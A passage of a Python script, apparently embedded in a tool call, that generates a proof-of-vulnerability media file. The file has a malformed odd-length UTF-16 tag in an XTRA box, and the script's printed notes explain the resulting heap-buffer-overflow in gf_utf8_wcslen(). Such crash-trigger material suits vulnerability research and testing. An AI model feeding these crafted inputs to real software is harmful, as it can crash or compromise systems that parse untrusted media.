>H", 0x0042)  # bytes 2-3: \'B\'\n    prop_data += struct.pack(">H", 0x0043)  # bytes 4-5: \'C\'\n    prop_data += struct.pack(">H", 0x0044)  # bytes 6-7: \'D\'\n    prop_data += struct.pack(">H", 0x0045)  # bytes 8-9: \'E\'\n    # One extra byte to make it ODD (this misaligns the terminator)\n    prop_data += b"\\xFF"  # byte 10: partial UTF-16 char (non-zero)\n    \n    assert len(prop_data) == actual_data_size, f"Size mismatch: {len(prop_data)} != {actual_data_size}"\n    \n    f.write(prop_data)\n    \n    # Update tag_size\n    tag_end = f.tell()\n    tag_size = tag_end - tag_start\n    f.seek(tag_start)\n    f.write(struct.pack(">I", tag_size))\n    f.seek(tag_end)\n    \n    # Update XTRA box size\n    xtra_end = f.tell()\n    xtra_size = xtra_end - xtra_start\n    f.seek(xtra_start)\n    f.write(struct.pack(">I", xtra_size))\n\nprint(f"Generated PoV at {output_path}")\nprint(f"Vulnerability trigger:")\nprint(f"  - XTRA box with UTF-16 string tag (prop_type=0)")\nprint(f"  - Actual data size: {actual_data_size} bytes (ODD)")\nprint(f"  - Parser allocates {actual_data_size + 2} bytes and appends 0x00,0x00")\nprint(f"  - UTF-16 scan reads u16 at offsets: 0,2,4,6,8,10,12...")\nprint(f"  - At offset 10: reads byte[10]=0xFF and byte[11]=0x00 -> u16 value 0xFF00 (non-zero)")\nprint(f"  - At offset 12: reads byte[12]=0x00 and byte[13]=??? (OUT OF BOUNDS)")\nprint(f"  - gf_utf8_wcslen() continues past allocated buffer -> heap-buffer-overflow!")\n'}
